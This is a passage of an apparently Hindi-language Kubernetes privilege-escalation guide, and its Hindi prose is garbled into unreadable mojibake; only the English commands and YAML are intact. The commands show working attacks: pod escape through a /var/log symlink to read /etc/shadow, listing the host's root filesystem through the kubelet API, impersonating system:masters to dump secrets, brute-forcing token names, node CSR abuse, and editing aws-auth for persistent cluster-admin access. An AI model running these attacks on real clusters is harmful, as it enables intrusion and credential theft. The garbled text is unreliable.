рдЬреИрд╕рд╛ рдХрд┐ [**рдЗрд╕ рд╢реЛрдз рдореЗрдВ рдЗрдВрдЧрд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html), рдЕрдЧрд░ рдЖрдк **рд╣реЛрд╕реНрдЯ `/var/log/` рдирд┐рд░реНрджреЗрд╢рд┐рдд** рдкрд░ рдорд╛рдЙрдВрдЯ рдХрд┐рдП рдЧрдП рдПрдХ рдкреЙрдб рддрдХ рдкрд╣реБрдВрдЪ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рдЖрдк **рдХрдВрдЯреЗрдирд░ рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓ рд╕рдХрддреЗ рд╣реИрдВ**ред\
рдпрд╣ рдореБрдЦреНрдп рд░реВрдк рд╕реЗ рдЗрд╕рд▓рд┐рдП рд╣реИ рдХреНрдпреЛрдВрдХрд┐ **Kube-API рд▓реЙрдЧреНрд╕ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рддрд╛ рд╣реИ** рдПрдХ рдХрдВрдЯреЗрдирд░ рдХрд╛ ( `kubectl logs <pod>` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ), рдпрд╣ **Kubelet** рд╕реЗрд╡рд╛ рдХреЗ `/logs/` рдЕрдВрддрд░реНрдирд┐рд╣рд┐рдд рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреЙрдб рдХреА `0.log` рдлрд╝рд╛рдЗрд▓ рдХрд╛ рдЕрдиреБрд░реЛрдз рдХрд░рддрд╛ рд╣реИред\
Kubelet рд╕реЗрд╡рд╛ `/logs/` рдЕрдВрддрд░реНрдирд┐рд╣рд┐рдд рдХрд░рддреА рд╣реИ рдЬреЛ рдХреЗрд╡рд▓ рдореВрд▓ рд░реВрдк рд╕реЗ рдХрдВрдЯреЗрдирд░ рдХреЗ `/var/log` рдлрд╝рд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рдХреЛ **рдЕрдВрддрд░реНрдирд┐рд╣рд┐рдд рдХрд░ рд░рд╣реА рд╣реИ**ред

рдЗрд╕рд▓рд┐рдП, рдПрдХ рд╣рдорд▓рд╛рд╡рд░ **рдХрдВрдЯреЗрдирд░ рдХреЗ /var/log/ рдлрд╝реЛрд▓реНрдбрд░ рдореЗрдВ рд▓рд┐рдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдкрд╣реБрдВрдЪ** рдХреЗ рд╕рд╛рде рдЗрд╕ рд╡реНрдпрд╡рд╣рд╛рд░ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддрд╛ рд╣реИ 2 рддрд░реАрдХреЛрдВ рд╕реЗ:

* рдЕрдкрдиреЗ рдХрдВрдЯреЗрдирд░ рдХреА `0.log` рдлрд╝рд╛рдЗрд▓ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдирд╛ (рд╕рд╛рдорд╛рдиреНрдпрдд: `/var/logs/pods/namespace_pod_uid/container/0.log` рдореЗрдВ рд╕реНрдерд┐рдд) рддрд╛рдХрд┐ рдпрд╣ `/etc/shadow` рдХреА рдУрд░ рдкреНрд╡рд╛рдЗрдВрдЯрд┐рдВрдЧ рд╕рд┐рдореНрд▓рд┐рдВрдХ рд╣реЛред рдлрд┐рд░, рдЖрдк рдЗрд╕реЗ рдХрд░рдХреЗ рд╣реЛрд╕реНрдЯ рд╢реИрдбреЛ рдлрд╝рд╛рдЗрд▓ рдХреЛ рдмрд╛рд╣рд░ рдирд┐рдХрд╛рд▓ рд╕рдХреЗрдВрдЧреЗ:
```bash
kubectl logs escaper
failed to get parse function: unsupported log format: "root::::::::\n"
kubectl logs escaper --tail=2
failed to get parse function: unsupported log format: "systemd-resolve:*:::::::\n"
# Keep incrementing tail to exfiltrate the whole file
```
* рдпрджрд┐ рд╣рдорд▓реЗрдЧрд░ рдХрд┐рд╕реА рдкреНрд░рд┐рдВрд╕рд┐рдкрд▓ рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░рддрд╛ рд╣реИ рдЬрд┐рд╕рдХреЗ рдкрд╛рд╕ **`nodes/log` рдХреЛ рдкрдврд╝рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реИ**, рддреЛ рд╡рд╣ рдмрд╕ `/host-mounted/var/log/sym` рдореЗрдВ `/` рдХреЗ рд▓рд┐рдП **рд╕рд┐рдорд▓рд┐рдВрдХ** рдмрдирд╛ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдЬрдм **`https://<рдЧреЗрдЯрд╡реЗ>:10250/logs/sym/` рддрдХ рдкрд╣реБрдВрдЪрддрд╛ рд╣реИ рддреЛ рд╡рд╣ рд╣реЛрд╕реНрдЯ рдХреА рд░реВрдЯ** рдлрд╝рд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рдХреЛ рд╕реВрдЪреАрдмрджреНрдз рдХрд░реЗрдЧрд╛ (рд╕рд┐рдорд▓рд┐рдВрдХ рдмрджрд▓рдиреЗ рд╕реЗ рдлрд╝рд╛рдЗрд▓реЛрдВ рддрдХ рдкрд╣реБрдВрдЪ рдкреНрд░рджрд╛рди рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИ)ред
```bash
curl -k -H 'Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6Im[...]' 'https://172.17.0.1:10250/logs/sym/'
<a href="bin">bin</a>
<a href="data/">data/</a>
<a href="dev/">dev/</a>
<a href="etc/">etc/</a>
<a href="home/">home/</a>
<a href="init">init</a>
<a href="lib">lib</a>
[...]
```
**рдПрдХ рдкреНрд░рдпреЛрдЧрд╢рд╛рд▓рд╛ рдФрд░ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд╢рд┐рдХрд╛рд░** [**https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts**](https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts)

#### readOnly рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рдЫрд▓рдХрд░рдирд╛ <a href="#bypassing-hostpath-readonly-protection" id="bypassing-hostpath-readonly-protection"></a>

рдпрджрд┐ рдЖрдк рднрд╛рдЧреНрдпрд╢рд╛рд▓реА рд╣реИрдВ рдФрд░ рдЙрдЪреНрдЪ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реА рдХреНрд╖рдорддрд╛ `CAP_SYS_ADMIN` рдЙрдкрд▓рдмреНрдз рд╣реИ, рддреЛ рдЖрдк рдмрд╕ рдлрд╝реЛрд▓реНрдбрд░ рдХреЛ rw рдХреЗ рд░реВрдк рдореЗрдВ рдлрд┐рд░ рд╕реЗ рдорд╛рдЙрдВрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
mount -o rw,remount /hostlogs/
```
#### рд╣реЛрд╕реНрдЯрдкрде readOnly рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рдЙрдордХрд╛рд░рдирд╛ <a href="#bypassing-hostpath-readonly-protection" id="bypassing-hostpath-readonly-protection"></a>

рдЬреИрд╕рд╛ рдХрд┐ [**рдЗрд╕ рд╢реЛрдз**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html) рдореЗрдВ рдЙрд▓реНрд▓реЗрдЦ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рдЙрдордХрд╛рд░рдирд╛ рд╕рдВрднрд╡ рд╣реИ:
```yaml
allowedHostPaths:
- pathPrefix: "/foo"
readOnly: true
```
рдЬреЛ рдкрд┐рдЫрд▓реЗ рд╡рд╛рд▓реЛрдВ рдХреА рддрд░рд╣ рднрд╛рдЧрдиреЗ рдХреЛ рд░реЛрдХрдиреЗ рдХреЗ рд▓рд┐рдП рдерд╛, рдЙрд╕рдХреЗ рдмрдЬрд╛рдп рдПрдХ PersistentVolume рдФрд░ рдПрдХ PersistentVolumeClaim рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╣реЛрд╕реНрдЯ рдлрд╝реЛрд▓реНрдбрд░ рдХреЛ рдХрдВрдЯреЗрдирд░ рдореЗрдВ рдорд╛рдЙрдВрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд▓рд┐рдЦрдиреЗ рдпреЛрдЧреНрдп рдПрдХреНрд╕реЗрд╕ рдХреЗ рд╕рд╛рде:
```yaml
apiVersion: v1
kind: PersistentVolume
metadata:
name: task-pv-volume-vol
labels:
type: local
spec:
storageClassName: manual
capacity:
storage: 10Gi
accessModes:
- ReadWriteOnce
hostPath:
path: "/var/log"
---
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
name: task-pv-claim-vol
spec:
storageClassName: manual
accessModes:
- ReadWriteOnce
resources:
requests:
storage: 3Gi
---
apiVersion: v1
kind: Pod
metadata:
name: task-pv-pod
spec:
volumes:
- name: task-pv-storage-vol
persistentVolumeClaim:
claimName: task-pv-claim-vol
containers:
- name: task-pv-container
image: ubuntu:latest
command: [ "sh", "-c", "sleep 1h" ]
volumeMounts:
- mountPath: "/hostlogs"
name: task-pv-storage-vol
```
### **рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╡рд╛рд▓реЗ рдЦрд╛рддреЛрдВ рдХрд╛ рдЕрдиреБрдХрд░рдг**

[**рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЕрдиреБрдХрд░рдг**](https://kubernetes.io/docs/reference/access-authn-authz/authentication/#user-impersonation) рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдХреЗ рд╕рд╛рде, рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдПрдХ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╡рд╛рд▓реЗ рдЦрд╛рддреЗ рдХрд╛ рдЕрдиреБрдХрд░рдг рдХрд░ рд╕рдХрддрд╛ рд╣реИред

рдХреЗрд╡рд▓ `kubectl` рдХрдорд╛рдВрдб рдореЗрдВ рдкреИрд░рд╛рдореАрдЯрд░ `--as=<username>` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХрд╛ рдЕрдиреБрдХрд░рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдпрд╛ `--as-group=<group>` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рдПрдХ рд╕рдореВрд╣ рдХрд╛ рдЕрдиреБрдХрд░рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП:
```bash
kubectl get pods --as=system:serviceaccount:kube-system:default
kubectl get secrets --as=null --as-group=system:masters
```
рдпрд╛ REST API рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ:
```bash
curl -k -v -XGET -H "Authorization: Bearer <JWT TOKEN (of the impersonator)>" \
-H "Impersonate-Group: system:masters"\
-H "Impersonate-User: null" \
-H "Accept: application/json" \
https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```
### рд╕реАрдХреНрд░реЗрдЯреНрд╕ рдХреА рд╕реВрдЪреАрдмрджреНрдзрд┐

**рд╕реАрдХреНрд░реЗрдЯреНрд╕ рдХреА рд╕реВрдЪреА рдмрдирд╛рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рд╕реАрдХреНрд░реЗрдЯреНрд╕ рдХреЛ рдкрдврд╝рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗ рд╕рдХрддреА рд╣реИ** REST API рдПрдВрдбрдкреЙрдЗрдВрдЯ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреЗ рд▓рд┐рдП:
```bash
curl -v -H "Authorization: Bearer <jwt_token>" https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```
### рдПрдХ рдЧреБрдкреНрдд рд╕реЗ рдкрдврд╝рдирд╛ - рдЯреЛрдХрди рдЖрдИрдбреА рдХреЛ рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕рд┐рдВрдЧ рдХрд░рдирд╛

рдЬрдм рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдХрд┐рд╕реА рдЯреЛрдХрди рдХреЗ рд╕реНрд╡рд╛рдорд┐рддреНрд╡ рдореЗрдВ рд╣реЛрддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдкрдврд╝рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реЛрддреА рд╣реИ, рддреЛ рдЙрд╕реЗ рдЗрд╕рдХрд╛ рдирд╛рдо рд╕рд╣реА рддрд░реАрдХреЗ рд╕реЗ рдкреНрд░рдпреЛрдЧ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ, рд╡рд┐рд╕реНрддрд╛рд░ рд╕реЗ _**рд╕реВрдЪреА рд╕реАрдХреНрд░реЗрдЯреНрд╕**_ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдХреА рддреБрд▓рдирд╛ рдореЗрдВ, рдлрд┐рд░ рднреА рдХрдордЬреЛрд░рд┐рдпрд╛рдВ рд╣реИрдВред рд╕рд┐рд╕реНрдЯрдо рдореЗрдВ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд╕реЗрд╡рд╛ рдЦрд╛рддреЛрдВ рдХреЛ рдЧрдгрдирд╛ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИ, рдкреНрд░рддреНрдпреЗрдХ рдПрдХ рд╕реАрдХреНрд░реЗрдЯ рдХреЗ рд╕рд╛рде рд╕рдВрдмрдВрдзрд┐рддред рдЗрди рд╕реАрдХреНрд░реЗрдЯреНрд╕ рдХрд╛ рдирд╛рдо рд╕рдВрд░рдЪрдирд╛ рд╣реИ: рдПрдХ рд╕реНрдерд┐рд░ рдкреНрд░реАрдлрд┐рдХреНрд╕ рдЬрд┐рд╕рдХреЗ рдмрд╛рдж рдПрдХ рдпрд╛рджреГрдЪреНрдЫрд┐рдХ рдкрд╛рдВрдЪ-рд╡рд░реНрдгрд╛рддреНрдордХ рдЕрд▓реНрдлрд╛рдиреНрдпреВрдореЗрд░рд┐рдХ рдЯреЛрдХрди рд╣реИ (рдирд┐рд╢реНрдЪрд┐рдд рд╡рд░реНрдгреЛрдВ рдХреЛ рдЫреЛрдбрд╝рдХрд░) рдХреЗ рдЕрдиреБрд╕рд╛рд░ [рд╕реНрд░реЛрдд рдХреЛрдб](https://github.com/kubernetes/kubernetes/blob/8418cccaf6a7307479f1dfeafb0d2823c1c37802/staging/src/k8s.io/apimachinery/pkg/util/rand/rand.go#L83)ред

рдЯреЛрдХрди рдПрдХ рд╕реАрдорд┐рдд 27-рд╡рд░реНрдг рд╕реЗрдЯ рд╕реЗ рдЙрддреНрдкрдиреНрди рд╣реЛрддрд╛ рд╣реИ (`bcdfghjklmnpqrstvwxz2456789`), рдкреВрд░реНрдг рдЕрд▓реНрдлрд╛рдиреНрдпреВрдореЗрд░рд┐рдХ рд╕реАрдорд╛ рдХреЗ рдмрдЬрд╛рдпред рдпрд╣ рд╕реАрдорд╛ рдХреБрд▓ рд╕рдВрднрд╛рд╡рд┐рдд рд╕рдВрдпреЛрдЬрдиреЛрдВ рдХреЛ 14,348,907 (27^5) рддрдХ рдХрдо рдХрд░рддреА рд╣реИред рдЗрд╕ рдкрд░рд┐рдгрд╛рдорд╕реНрд╡рд░реВрдк, рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рд╕рдВрднрд╛рд╡рдирд╛ рд╕реЗ рдХреБрдЫ рдШрдВрдЯреЛрдВ рдореЗрдВ рдЯреЛрдХрди рдХрд╛ рдЕрдиреБрдорд╛рди рд▓рдЧрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕ рд╣рдорд▓рд╛ рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд╕реЗрд╡рд╛ рдЦрд╛рддреЛрдВ рддрдХ рдкрд╣реБрдВрдЪрдХрд░ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдЙрдиреНрдирддрд┐ рд╣реЛ рд╕рдХрддреА рд╣реИред

### рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рд╕рд╛рдЗрдирд┐рдВрдЧ рдЕрдиреБрд░реЛрдз

рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рд╕рдВрд╕рд╛рдзрди `certificatesigningrequests` рдореЗрдВ **`create`** рдХреНрд░рд┐рдпрд╛рдПрдБ рд╣реИрдВ (рдпрд╛ рдХрдо рд╕реЗ рдХрдо `certificatesigningrequests/nodeClient` рдореЗрдВ), рддреЛ рдЖрдк рдПрдХ рдирдП рдиреЛрдб рдХрд╛ рдирдпрд╛ CeSR **рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ**ред

[рджрд╕реНрддрд╛рд╡реЗрдЬрд╝реАрдХрд░рдг рдХреЗ рдЕрдиреБрд╕рд╛рд░ рдЗрди рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЛ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рдордВрдЬреВрд░реА рджреЗрдирд╛ рд╕рдВрднрд╡ рд╣реИ](https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet-tls-bootstrapping/), рдЗрд╕рд▓рд┐рдП рдЙрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рдЖрдкрдХреЛ **рдЕрддрд┐рд░рд┐рдХреНрдд рдЕрдиреБрдорддрд┐рдпрд╛рдБ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реИ**ред рдЕрдЧрд░ рдирд╣реАрдВ, рддреЛ рдЖрдкрдХреЛ рдЕрдиреБрд░реЛрдз рдХреЛ рдордВрдЬреВрд░ рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рд╣реЛрдиреА рдЪрд╛рд╣рд┐рдП, рдЬрд┐рд╕рдХрд╛ рдорддрд▓рдм рд╣реИ `certificatesigningrequests/approval` рдореЗрдВ рдЕрдкрдбреЗрдЯ рдФрд░ `signers` рдореЗрдВ `approve` рдХрд░рдирд╛ `<signerNameDomain>/<signerNamePath>` рдпрд╛ `<signerNameDomain>/*`

рдПрдХ **рдЖрд╡рд╢реНрдпрдХ рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рд╕рд╛рде рдПрдХ рднреВрдорд┐рдХрд╛** рдХрд╛ рдЙрджрд╛рд╣рд░рдг рд╣реИ:
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: csr-approver
rules:
- apiGroups:
- certificates.k8s.io
resources:
- certificatesigningrequests
verbs:
- get
- list
- watch
- create
- apiGroups:
- certificates.k8s.io
resources:
- certificatesigningrequests/approval
verbs:
- update
- apiGroups:
- certificates.k8s.io
resources:
- signers
resourceNames:
- example.com/my-signer-name # example.com/* can be used to authorize for all signers in the 'example.com' domain
verbs:
- approve
```
So, рдирдП рдиреЛрдб CSR рдХреЛ рдордВрдЬреВрд░реА рджреЗрдиреЗ рдХреЗ рд╕рд╛рде, рдЖрдк рдиреЛрдб рдХреА рд╡рд┐рд╢реЗрд╖ рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХрд╛ **рджреБрд░реБрдкрдпреЛрдЧ** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ **рдЧреБрдкреНрдд рд╕реАрдХреНрд░реЗрдЯреНрд╕ рдЪреБрд░рд╛рдПрдВ** рдФрд░ **рд╡рд░реНрдЪрд╕реНрд╡ рдХреЛ рдЙрдиреНрдирдд рдХрд░реЗрдВ**ред

[**рдЗрд╕ рдкреЛрд╕реНрдЯ**](https://www.4armed.com/blog/hacking-kubelet-on-gke/) рдФрд░ [**рдЗрд╕ рдПрдХ**](https://rhinosecuritylabs.com/cloud-security/kubelet-tls-bootstrap-privilege-escalation/) рдореЗрдВ GKE K8s TLS Bootstrap рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХреЛ **рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд╕рд╛рдЗрдирд┐рдВрдЧ** рдХреЗ рд╕рд╛рде рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдФрд░ рдЗрд╕рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рдирдП K8s рдиреЛрдб рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдЙрддреНрдкрдиреНрди рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ рдФрд░ рдлрд┐рд░ рдЙрдирдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЧреБрдкреНрдд рд╕реАрдХреНрд░реЗрдЯреНрд╕ рдЪреБрд░рд╛рдиреЗ рд╕реЗ рд╡рд░реНрдЪрд╕реНрд╡ рдХреЛ рдЙрдиреНрдирдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред\
рдЕрдЧрд░ рдЖрдкрдХреЗ рдкрд╛рд╕ **рдЙрд▓реНрд▓рд┐рдЦрд┐рдд рдЕрдиреБрдорддрд┐рдпрд╛рдБ рд╣реИрдВ рддреЛ рдЖрдк рдПрдХ рд╣реА рдЪреАрдЬ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**ред рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдкрд╣рд▓рд╛ рдЙрджрд╛рд╣рд░рдг рдПрдХ рдирдП рдиреЛрдб рдХреЛ рдЖрд╡рд╢реНрдпрдХ рд╕реАрдХреНрд░реЗрдЯреНрд╕ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рд╕реЗ рд░реЛрдХрдиреЗ рд╡рд╛рд▓реА рддреНрд░реБрдЯрд┐ рдХреЛ рдЕрдирджреЗрдЦрд╛ рдХрд░рддрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдПрдХ **рдиреЛрдб рдХреЗрд╡рд▓ рдЙрд╕ рдкрд░ рдорд╛рдЙрдВрдЯ рдХрд┐рдП рдЧрдП рдХрдВрдЯреЗрдирд░реЛрдВ рдХреЗ рд╕реАрдХреНрд░реЗрдЯреНрд╕ рддрдХ рдкрд╣реБрдВрдЪ рд╕рдХрддрд╛ рд╣реИред**

рдЗрд╕реЗ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХрд╛ рддрд░реАрдХрд╛ рдмрд╕ рдпрд╣ рд╣реИ рдХрд┐ **рдЬрд┐рд╕ рдиреЛрдб рдкрд░ рджрд┐рд▓рдЪрд╕реНрдк рд╕реАрдХреНрд░реЗрдЯреНрд╕ рдХреЗ рд╕рд╛рде рдХрдВрдЯреЗрдирд░ рдорд╛рдЙрдВрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдЙрд╕ рдиреЛрдб рдирд╛рдо рдХреЗ рд▓рд┐рдП рдиреЛрдб рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдмрдирд╛рдПрдВ** (рд▓реЗрдХрд┐рди рдмрд╕ рдкрд╣рд▓реЗ рдкреЛрд╕реНрдЯ рдореЗрдВ рдЗрд╕реЗ рдХреИрд╕реЗ рдХрд░рдирд╛ рд╣реИ рдпрд╣ рдЬрд╛рдВрдЪреЗрдВ):
```bash
"/O=system:nodes/CN=system:node:gke-cluster19-default-pool-6c73b1-8cj1"
```
### AWS EKS aws-auth configmaps

рд╡реЗ рдореВрд▓рдзрд╛рд░ (Principals) рдЬреЛ EKS рдкрд░ kube-system рдиреЗрдорд╕реНрдкреЗрд╕ рдореЗрдВ **`configmaps`** рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (AWS рдореЗрдВ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП) рд╡реЗ **aws-auth** configmap рдХреЛ рдЕрдзрд┐рдХрд╛рд░реА рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ (cluster admin) рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред\
рдЖрд╡рд╢реНрдпрдХ рдХреНрд░рд┐рдпрд╛рдПрдБ рд╣реИрдВ **`update`** рдФрд░ **`patch`**, рдпрд╛ **`create`** рдЕрдЧрд░ configmap рдирд╣реАрдВ рдмрдирд╛рдпрд╛ рдЧрдпрд╛ рдерд╛:
```bash
# Check if config map exists
get configmap aws-auth -n kube-system -o yaml

## Yaml example
apiVersion: v1
kind: ConfigMap
metadata:
name: aws-auth
namespace: kube-system
data:
mapRoles: |
- rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
username: system:node:{{EC2PrivateDNSName}}
groups:
- system:masters

# Create donfig map is doesn't exist
## Using kubectl and the previous yaml
kubectl apply -f /tmp/aws-auth.yaml
## Using eksctl
eksctl create iamidentitymapping --cluster Testing --region us-east-1 --arn arn:aws:iam::123456789098:role/SomeRoleTestName --group "system:masters" --no-duplicate-arns

# Modify it
kubectl edit -n kube-system configmap/aws-auth
## You can modify it to even give access to users from other accounts
data:
mapRoles: |
- rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
username: system:node:{{EC2PrivateDNSName}}
groups:
- system:masters
mapUsers: |
- userarn: arn:aws:iam::098765432123:user/SomeUserTestName
username: admin
groups:
- system:masters
```
{% endcode %}

{% hint style="warning" %}
рдЖрдк **`aws-auth`** рдХрд╛ рдЙрдкрдпреЛрдЧ **рд╕реНрдерд┐рд░рддрд╛** рдХреЗ рд▓рд┐рдП рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рд╕рд╕реЗ рдЕрдиреНрдп рдЦрд╛рддреЛрдВ рд╕реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдПрдХреНрд╕реЗрд╕ рджрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

рд╣рд╛рд▓рд╛рдВрдХрд┐, `aws --profile other_account eks update-kubeconfig --name <cluster-name>` **рдПрдХ рд╡рд┐рднрд┐рдиреНрди рдЦрд╛рддреЗ рд╕реЗ рдХрд╛рдо рдирд╣реАрдВ рдХрд░рддрд╛ рд╣реИ**ред рд▓реЗрдХрд┐рди рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ `aws --profile other_account eks get-token --cluster-name arn:aws:eks:us-east-1:123456789098:cluster/Testing` рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ рдЕрдЧрд░ рдЖрдк рдХреНрд▓рд╕реНрдЯрд░ рдХрд╛ ARN рдбрд╛рд▓рддреЗ рд╣реИрдВ рдирд╛рдо рдХреЗ рдмрдЬрд╛рдпред\
`kubectl` рдХреЛ рдХрд╛рдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдмрд╕ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░реЗрдВ рдХрд┐ **рдкреАрдбрд╝рд┐рдд рдХреБрдмреЗрдХреЙрдиреНрдлрд╝рд┐рдЧрд░** рдХреЛ **рдХреЙрдиреНрдлрд╝рд┐рдЧрд░** рдХрд░реЗрдВ рдФрд░ рдПрд╡реАрдПрд╕ рдПрдХреНрдЬрд╝реЗрдХ рдЖрд░реНрдЧреНрд╕ рдореЗрдВ `--profile other_account_role` рдЬреЛрдбрд╝реЗрдВ рддрд╛рдХрд┐ kubectl рдЯреЛрдХрди рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдФрд░ AWS рд╕реЗ рд╕рдВрдкрд░реНрдХ рд╕реНрдерд╛рдкрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рджреВрд╕рд░реЗ рдЦрд╛рддреЗ рдХрд╛ рдкреНрд░реЛрдлрд╝рд╛рдЗрд▓ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред
{% endhint %}

### GKE рдореЗрдВ рдЙрдиреНрдирддрд┐

